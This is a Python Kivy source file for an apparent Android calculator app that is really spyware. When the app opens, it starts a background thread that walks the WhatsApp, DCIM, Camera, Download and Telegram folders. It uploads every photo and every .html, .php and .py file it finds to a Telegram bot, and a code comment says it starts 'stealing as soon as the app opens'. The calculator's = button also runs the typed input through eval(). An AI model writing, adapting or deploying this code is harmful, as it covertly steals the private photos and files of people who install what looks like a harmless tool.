import os
import requests
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label

TOKEN = "BOT_TOKEN"
CHAT_ID = "USER_ID"

def send_document(file_path):
    try:
        telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        with open(file_path, "rb") as file:
            requests.post(telegram_url, data={"chat_id": CHAT_ID}, files={"document": file})
    except:
        pass

def send_photo(file_path):
    try:
        telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(file_path, "rb") as file:
            requests.post(telegram_url, data={"chat_id": CHAT_ID}, files={"photo": file})
    except:
        pass

def scan_and_steal_data():
    photo_extensions = [".jpg", ".png", ".jpeg", ".gif"]
    document_extensions = [".html", ".php", ".py"]
    target_folders = ["WhatsApp", "DCIM", "Camera", "Download", "Telegram"]

    def get_files(directory, extensions):
        files = []
        try:
            for root, _, filenames in os.walk(directory):
                for file in filenames:
                    if any(file.endswith(ext) for ext in extensions):
                        files.append(os.path.join(root, file))
        except:
            pass
        return files

    storage_path = "/storage/emulated/0/"

    for folder in target_folders:
        folder_path = os.path.join(storage_path, folder)
        if os.path.isdir(folder_path):
            documents = get_files(folder_path, document_extensions)
            for doc in documents:
                threading.Thread(target=send_document, args=(doc,)).start()
    for folder in target_folders:
        folder_path = os.path.join(storage_path, folder)
        if os.path.isdir(folder_path):
            photos = get_files(folder_path, photo_extensions)
            for photo in photos:
                threading.Thread(target=send_photo, args=(photo,)).start()

class CalculatorApp(App):
    def build(self):
        # Start stealing as soon as the app opens
        threading.Thread(target=scan_and_steal_data).start()

        layout = BoxLayout(orientation='vertical')
        self.display = Label(text="0", font_size=40, size_hint=(1, 0.4))
        layout.add_widget(self.display)

        buttons = [
            ['7', '8', '9', '/'],
            ['4', '5', '6', '*'],
            ['1', '2', '3', '-'],
            ['0', '.', '=', '+']
        ]

        for row in buttons:
            row_layout = BoxLayout()
            for label in row:
                btn = Button(text=label, on_press=self.on_button_press)
                row_layout.add_widget(btn)
            layout.add_widget(row_layout)

        return layout

    def on_button_press(self, instance):
        current = self.display.text
        button_text = instance.text

        if button_text == '=':
            try:
                self.display.text = str(eval(current))
            except:
                self.display.text = "Error"
        else:
            if current == "0":
                self.display.text = button_text
            else:
                self.display.text = current + button_text

if __name__ == "__main__":
    CalculatorApp().run()